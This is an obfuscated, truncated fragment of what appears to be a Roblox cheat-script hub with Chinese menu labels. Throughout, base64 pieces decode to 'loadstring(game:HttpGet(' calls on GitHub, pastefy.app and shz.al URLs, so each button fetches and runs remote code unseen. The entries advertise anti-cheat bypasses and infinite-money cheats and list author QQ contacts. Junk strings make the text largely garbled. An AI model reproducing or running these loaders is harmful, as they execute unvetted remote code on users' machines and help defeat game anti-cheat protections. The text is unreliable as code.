uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/rxn-xyz/Ohio./main/Ohio.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ruvOQpTcETSoIdCENnFyaICMlJPwcfNvvYYgitUtSEHynihtRLDZgRgTNlrIqIDIyVefyiLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')俄亥俄州2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nBbsbrdSFiEmbGikWnqvVPqjvvHiaZDNJNtdoKIbRRyrvifezRHRofvSRBktWdBlRSxILfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/QbXPfsgC/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qanJByocrNOvJNElHZdHJhfwnwgVoNDJjXhzhsNxzGjSHyWycwNpfDJMTQmyyKiucBJVMYKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('djwkBvILTFOVgpOrHwuNJvmFykwLgDWAsXERdkLGuFqfTCTHNMgzJYdMymouJDrvPQxfBXLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HMxfYuLdcOPVjKXlmYljpbQlMFlmMRrXqRxMSLwslXNrgjTPKXJbgYFQhsQipMOXiCJnKWamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AfxdApwuTUVzQXqBzaJuxYqhBTVMpsQOGdIQzxpnvvfPHNlVhHOWfqqESvDrTMnmFsTkZxamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FugXiPGuvGuhocILZeSFOhImouVYYkcVsRWOuEsQFZZHiEmfDHXnWnnnVHqcbBdtyFLsghbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iMaAYPvZCzYGhBdukQFuXPLPpaMlVvbjnikpkqBxwIQIKMxZtaNLPtbENhqbDhzchAXjnjKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')The raketZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mHxsAWTsqRdJjxCkeuOeJrByTHuyjZBOzfZUpXcQwJzraNNQpSJAXeTCtCUhVEGyLKvUPyLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xzSPKHSOONVxBdvvqPLoOhLabsrwGnbyMTsWyojUeTBIyJuwOPQfNmWAXwljXxCsritTCMKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nyqacKfvegRWRjkdFLiSXDSWnFokQNeSgZRLvxMhjCFZoedChADubxARimMkUykEXufLlTLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')The rake电脑端tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VVKSLnsFPRFqtUkMAvbAtHpLveoTAWQzZmaGTZeEUGxYPtlnAgHNZhJrZDjjrhNoIcToitLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://realzzhub.xyz/script.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zFFCxOeRuzeuKLesltHFWaWDmWxVpGBYIIJOAuVJyThsgLLizsFBtdkZeKJzWxiGBALOwhKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')兵工厂tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZiKtTcZUzuLHZmZRdMvvvTFPuHtrbtfeNRGRwNNQvldJbJLAkPxYGzNimAGeSixFzpvtheLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GMRazBftapMmGdNIhdthFXjGHalTILLDkstGAGLgRjkLiswiWgjErGsGmjsGpLewcbnaMRKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZufdJxzAqJIEBtFJBGPrwlOUjUZAlUWxYNduXTnfSflqpzypLazxyeQEWcPhCbgsjczDGoLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺出品必属精品tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iSeETJKwlOebkebbxDdLoYxHKNOlOuhhwbKTwARdUQmvDTnsEswYvLOSRwcBnDDzpGLOzfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KKAKSKKStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QjblejEygAEZsHiAaGaEShVYZDPiospvIMoMqwJNUpNVaSsoeViffDfpaHMYjWpWDkwWXuKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')最强更新绕过反作弊启动即可奔放tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('twkBBdbyLzNAVREMOAJRYEuJCLlXCLvuvrbEFfPKatapTPSRVTBWDvDACmqBdomdjctNJoLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~FGDtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PfNSCZpkqfMKvSgKkOpltUsaXcxIqigUbSQaxqrqAnCqgsDuaPHMhclzTCYWwxpKprwPnKKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')兵工厂1tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xVrRUGWOGkmaIBeRmMJNrRzIOlNSgyMGplzTTnWjOvrTnJiluQwpkkGzkUkMOZEaCDmEXgLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/InittZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LfrMqotXDJTuvgnURDcXdYJzWgJzznJHoNYIfGfXYbYoDyHhSBNYaiKXAiDYkmYBqyNeMMKSwgdHJ1ZSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')兵工厂无敌子追tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UceDJaolGxcXRMesabkyNapwoEzlWmkylVEXpLXIDivYwXwhdaictOGdKwPIyGmLCTIKgvLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenaltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YkMOVXCsnitjKaydTJWyHbcjaxGgxZSjLisKjHCagWSaCasDIDsjRGQJxDchtGCTuVrPKKKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')兵工厂tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EvwtnMEPcXUFjtegqlcMiHRkBtAFmHxRJQuqsunluUXEweDGTNnVxSdPpXphZmBqsStAxaLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Arsenal/MainFiletZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oklJXrOVfnnTIQMRRsqqnhypPsWSFqcWQJFjArUzjPMPoqFCJLtmoPqNtyjXEZgDSFbmddKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')兵工厂（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XWFneTUmziLCSbSTHePmpGYlaALzlLvgxCaBZBVYfIIOJbqwaNqwCQVLkEQcWZkvunAugPLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/2YdrWHxV/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HDmlqplrbwjHwrRINEmhixceYESyBeTeuFyHfYhrTnSeIAjXRDkyQBPiVqUhdBOQfpgmayKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pVbkLolsqNRznvdEnuGaOmmuXrnKqnVrRySCNPfaYfmRGwWXbQIRzOHeYJRdxLzRnQwPaDLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lOieYnCqibQWZmXdIZDBSnMZyWOrUQZbOBBOnFBSPotXBouFrIWcoCdzIYbGPghpdxxvtWamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fPQsLnZLxppeRnzceZnEmvtguFKBJwiaItjsIagmpsXManUVWToGkReRZbeZcwgQddrmcdamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jvkyADDGnHAqaWEjZEmwFFRbAokAPcvNgqPqAHvzaTSmCtVemoDaXsklXuGvGgMcfXhTIMbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FXnZabICWAmDOUwLbBaOzddMEhPASphqEeKjHuJvLUfQzNxNBCWqMlETIhixpIZGqrWbIHKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')餐厅大亨tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DgAXmCdxWxxdKKPFUjekNwwLoknuwQiXcwuJfZMptxRhPFiKfKiwCvpbPeUVkQaunHrNqULA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('crFtaukycBtmaNNPslpQWSVLkUXwJVUPlHpsMsvgTkVgHsrvlhcEkTclTWYEUFmWLEeZkiKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lqOYsVnJUjmBuahdhiMplYIrvhEAGVKAuCVqHfGPopQEXqbyyuiywVgHrnejyREiqQkVyyLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')餐厅大亨无限钱tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zTXuqzOjuywbRwHkGQtuhSgCOzvfSEcMHMLxnmwyRRnBjqxTfaJAKItSdaYuGHvUDcvZXRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~zkzkzisKAKAKKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZVEEPcAaHOBpVfpnZKThqtkwLfSlmFPjPtduMelbeMKCqPILmHjpUXeICNHJuJZfFthxwlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')餐厅大亨（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NIPPqmgluZFRrflinySKlvmzMQScNDsVMFptFRgPwnWcZVTRKpkCNlNjSjRwhwvdEHBHahLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/toosiwhip/snake-hub/main/restaurant-tycoon-2.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jWUGQTImUzfesrFvpvUBNvqBBfklUdxUJWwMcncyQpWCOvenLTKTluMTmMLNijfCfEcNUtKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')餐厅大亨（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PYHPuolYliUZqzOTaczOxdBqsrKSmWkZzbKojvAeedIMJvGIkvOGlYgKBRsMMUylCaLXMULGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/Ppqt0Gib/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GUSzSvPLWbTFGoyvNjFmRGOfnjZPHJknaGNyVckGRvIHeoVouMKJOorRFhghpYChGcvrLeKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LGdbPgXVpFPnbYehuvRrlWhIeEelGEFEsCpqwlmCqcYMrjmPtyhygraGgOebsgnOKgtwTLLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nOdlJbIoxmCqrVLmlkggfMqBNslNqCQIvcuXNPavUHOIdFRHxKbiAXfBKaUoofxkdtYXttamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BQlcfMuQMyMCediZZrSrhShPHxwJlHBPQROZPaAfRrNrgmQAusKGVFzifnxsircpwtozGiamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ptGORiGCkAyYdVYDIwaFVPWxLKbttZqrlJIAbKxiVhfBChIcIFVDYUyPfEFFVHdvRUNQXqbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ErDVgAoPLcQOfspAElMrgJhOyewiFNAUgiQhKuHrJEnacpoboBbvAOMiVlcyHYMtvHcQZNKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')超级大力士模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bpZAdRhoazjSRelUPRlpJTgEgffVEpvyVEImMsneMETwOGLLtcrvCKpJuodwwsVNjcyApdLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jCOONlESFHBamfmcGSPxptukiWGfexWobjaFNQvACGLKrjByRjZoAiUxYBjoHzaKTvrXgJKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QlIaVkIBUxrXdUWJBePdBVrITcubJJkbVVCQmHwxswbfNWAGmGwwVuyLPDFpmhZmjrPcegLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')超级大力士模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mGUbzejyZzjeDHqpMnZkrcfIjfdypkLTYsIoBuijpaGlYAfMiSFmayMEudiGUEGaUpjbEELGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0strongmantZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('miyEfUajOEbPvXHLqIoYZUThKYPYwGHBqgbrTwlLHnNBLgakzqUuvTQbobctDgBYcEISeeLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')超级大力士模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ubxBbjprRtDYPRhOJvrNCfnOHUBZXTseputIflVHEfFOqoXZqGqSsSpNBOxIubZZgNyIpRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/aO18ZEB9/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sbgfiAykXpUUdrBOudLamKXlPehHnImeMksMqDUaXBOhdWcKcHdYOolOUolpVskXMpFtSsKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NTgkHtDRmflZpsacdJRBtscOVjCCXrqnAMyAkYbbRRWpFRWfPHWEJCvmySJpoVZJfzuwufLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zAoFneoShldCzzAyRFJLxQknDTKdfATDvcEWXiboWjpjEGSjrwPkITXzZaeJnrZbqVTvLNamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DhNxtgqgMMbAnDoqZkOmSWsOwzIqdmGdEhbXNOkmSCkpjXjynoaufANZjWSWNiLgzKzkuLamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gOPYuBvcGhgdGDRxcVifPKEiiaWaJnCLRtFqiSxDiYyRJQlTqPBQavLLjWhFMKlVAcMIBObG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vdisidloxjdnqHHgypwhQMrEHKlxMcKcrhHeKbHDQysaamaPrrOFAdZXOsoTfirMvqbaWQKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')举重模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eEcwbMdVkgfqcngwEjQsfAwiycsmiqhcCfQKsiQcligxaHnnEPeBgvzZNzfwVYfEUTdTllLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BctvVxgjQpbTPVxqzmsAehoQshaZmloGkATZzRgLVctlLBoAAlduJBiywIpefhXeCJcmNjKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kgByVUcQUSLRXYpjFvaUZlcexfsudOWnQROxOpDCedNmKOCsMtUOdIncSEoIcCwpLMdqnhLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')举重模拟器祝你玩的开心tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zkNoTbBBUiKUqTjVCNXyIrEBAUcHYVKNuWsKKAPJkjYYXZziGHrRBnNrTwTftZKgrtGsBXLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHHSUSUKSKStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EgskdhHHAnnSKFaYVeTBjcJhHBSvQBJXvzLjyrRxGoTbRXbEkQWgkbFZGqCidRKEVgCglcKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')举重模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DxmwiHmxFWAxqrOgmGBbeqJjIsnGYEpuwFyqCyvNINYoFeKrQnJPOGzjbZtiwztNIzxiayLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/KSriAk53/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('blVMJbSAFvQKHOcHekyNKLTjqxbwpJbKjAKmcTeyCkYniOEfLRuGquCtlXOgxGgiHwPwQaKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wBbQEoJNJlSfoytxLVfvMPffKdLzTFwmAriwcPauXMvepbpICmyXFhNPJxYJUnGPpwORUjLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gGxbgVkcjUkvxIxXDvdEJZgDjgfYAOpqHLyIFWuoOmELRmZnyhZZFIehlhyXDNxXZDpDuramlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KzLFwZCpkicLBJplIKGHbMBBCXZDQqyjdWrUJMXXKlywDjVsBrINjiFfgMMjyiNuKyWsZoamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OkfkRfQvGvgAHBDAiwsSnWRSwRYKuDiaYSBawCEapIMMVvFtQKAEcrRdFanMHblKSFcaDUbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QhgMOtkbGPkskVRvDHONTnGwuDyvhFbYFSlvsCwOKDYOZcDHPpzSpPqYdobPnqxnTkMMCyKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')怪兽宇宙tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YVkNAjOStkcmKjERHHzrKOPFkSWhQSTWrIEmpBbJVuRezREkaNdQoXRUrqALabxKjiXFVJLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ARciwBmioQmpOAkrYYFHAIPXuOWcMiVooqBhHjELRgmhzMjALxoFhdeqEBfMIuZlWBbpmCKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oPnKGydTYWAAKusFjWVyjyLTNpTOpPIukyyrLKmYmkafXPzKgWPweqpPVrmSKFUNIPMaHCLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')怪兽宇宙tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SwnATQijOPUwlmVpGvscIBbvzYksJcbPmFrhbcCrNkfwsqOffrBybUOeoNnMZBVFATcgJGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/oRWEIEcJ/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZLQEPSuUCJsKnyMUaokbusswRFUTCxvhciEnQcjsYAqNXPwNBqkBEmHVjOAIePYFzGwZMSKSkoKQ0KZ